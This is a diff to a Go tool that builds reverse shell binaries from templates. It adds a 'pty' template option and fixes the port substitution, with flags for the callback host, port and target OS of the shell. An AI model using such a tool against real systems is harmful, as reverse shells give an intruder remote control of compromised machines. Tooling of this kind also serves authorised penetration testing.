@@ -34,15 +34,15 @@ func initArgs() (string, string, string, string, string) {
 	host := flag.String("i", "localhost", "IP of the host which the reverse shell will connect to.")
 	port := flag.String("p", "1111", "Port of the host which the reverse shell will connect to.")
 	serverOs := flag.String("s", "linux", "OS of the server which will start the reverse shell (used to build the right binary) available : \"windows\", \"linux\".")
-	template := flag.String("t", "native", "Template to use to generate the reverse shell. Available : \"native\", \"tty\".")
+	template := flag.String("t", "native", "Template to use to generate the reverse shell. Available : \"native\", \"pty\".")
 	listenPort := flag.String("l", "0", "Port to listen (you can use this argument to bind to your reverse shell).")
 	flag.Parse()
 	if flag.NFlag() == 0 {
 		println("[+] No argument passed. Using default values.")
 	}
 	switch *template {
-	case "tty":
-		*template = "Go-TTY-RevShell.template"
+	case "pty":
+		*template = "Go-PTY-RevShell.template"
 	default:
 		*template = "Go-RevShell.template"
 	}
@@ -54,7 +54,7 @@ func buildReverseShell(port, host, templateFileName, serverOs string) {
 	template, err := ioutil.ReadFile("templates/" + templateFileName)
 	handleError("Reading template", err)
 	template = bytes.ReplaceAll(template, []byte("template-host"), []byte(host))
-	template = bytes.ReplaceAll(template, []byte("template-port"), []byte("1111"))
+	template = bytes.ReplaceAll(template, []byte("template-port"), []byte(port))
 	tmpFileName, finalFileName, fileExt := "tmp.go", "Go-RevShell", ""
 	handleError("Writing template to temp file", ioutil.WriteFile(tmpFileName, template, 0600))
 	if serverOs == "windows" {
